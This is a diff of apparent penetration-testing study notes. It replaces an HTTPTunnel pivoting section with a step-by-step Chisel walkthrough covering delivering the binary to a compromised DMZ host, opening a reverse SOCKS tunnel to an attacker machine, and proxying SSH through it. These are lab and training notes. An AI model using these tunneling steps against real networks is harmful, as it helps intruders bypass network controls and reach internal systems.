@@ -143,7 +143,7 @@ I try as much as possible to link to the various sources or inspiration for thes
     - [ssh.exe](#sshexe)
     - [Plink.exe](#plinkexe)
     - [Netsh](#netsh)
-    - [HTTPTunnel-ing through Deep Packet Inspection](#httptunnel-ing-through-deep-packet-inspection)  
+    - [HTTP Tunneling](#http-tunneling)  
   - [Linux Privilege Escalation](#linux-privilege-escalation)
     - [Resources](#resources-1)
     - [Strategy](#strategy)
@@ -3703,21 +3703,22 @@ The first time plink connects to a host, it will attempt to cache the host key i
 `netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=<IP> localport=<port> action=allow`
 
 
-### <ins>HTTPTunnel-ing through Deep Packet Inspection</ins>
+### <ins>HTTP Tunneling</ins>
 
-Note: HTTPTunnel uses both a client (`htc`) and a server (`hts`)
+#### <ins>Chisel</ins>
+1. The machines are KALI01, DMZ01 and INTERNAL01
+   - KALI01 will listen on TCP port `1080`, a SOCKS proxy port
+2. In KALI01, copy the [Chisel](https://www.kali.org/tools/chisel/) binary to the Apache2 server folder `sudo cp $(which chisel) /var/www/html/` and start Apache2 `sudo systemctl start apache2`
+3. Deliver the Chisel executable to the DMZ
+4. On KALI01, run Chisel `chisel server --port 8080 --reverse` and run `sudo tcpdump -nvvvXi <INTERFACE> tcp port 8080`
+   - `ip a` retrieve the list of all interfaces
+5. On DMZ01, run the Chisel client command`/tmp/chisel client <KALI01-IP>:8080 R:socks > /dev/null 2>&1 &`
+6. Now, you should be able to see inbound Chisel traffic and an incoming connection in the Chisel server
+7. Check if the SOCKS port has been opened by the Kali Chisel server with `ss -ntplu`
+8. Finally, pass an Ncat command to ProxyCommand to use the socks5 protocol and the proxy socket at 127.0.0.1:1080
+   - `ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' <username>@<IP>`
+   - `%h` and `%p` tokens represent the SSH command host and port values
 
-1. To begin building our tunnel, create a local SSH-based port forward between the compromised Linux machine and the Windows remote desktop target
-   - `ssh -L 0.0.0.0:8888:192.168.1.110:3389 user@127.0.0.1`
-   - `ss -antp | grep "8888"`
-2. Create an HTTPTunnel out to our Attacker Linux machine in order to slip our traffic past the HTTP-only protocol restriction
-   - `hts --forward-port localhost:8888 1234`
-   - `ps aux | grep hts`
-   - `ss -antp | grep "1234"`
-3. We need an HTTPTunnel client that will take our remote desktop traffic, encapsulate it into an HTTP stream, and send it to the listening HTTPTunnel server
-   - `htc --forward-port 8080 <IP>:<PORT>`
-   - `ps aux | grep htc`
-   - `ss -antp | grep "8080"`
 
 
 ### <ins>Linux Privilege Escalation</ins>
